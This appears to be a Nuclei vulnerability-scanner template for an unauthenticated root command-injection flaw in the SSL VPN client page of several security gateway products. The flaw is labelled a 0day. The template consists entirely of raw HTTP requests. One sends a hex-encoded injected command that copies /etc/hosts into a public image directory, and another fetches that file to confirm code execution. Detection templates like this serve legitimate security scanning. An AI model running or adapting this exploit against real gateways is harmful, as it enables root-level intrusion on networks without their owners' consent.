id: multiple-security-gateway-rce

info:
  name: Multiple Security Gateway RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A 0day RCE vulnerability in multiple security gateway products allows attackers to execute arbitrary code with root privileges without requiring login credentials.
  reference:
    - https://gobies.org/
  tags: rce, 0day

variables:
  cmd_encoded: "{{base64('cat /etc/hosts')}}"

http:
  - raw:
      - |
        GET /sslvpn/sslvpn_client.php HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers:
      - type: status
        status: [200]

  - raw:
      - |
        GET /sslvpn/sslvpn_client.php?client=logoImg&img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%63%70%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: iframe
        Referer: {{BaseURL}}
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "6drcdfs34c1h"
        part: body

  - raw:
      - |
        GET /webui/images/basic/login/main_logo21.txt HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: iframe
        Referer: {{BaseURL}}
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9

    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "localhost"
        part: body
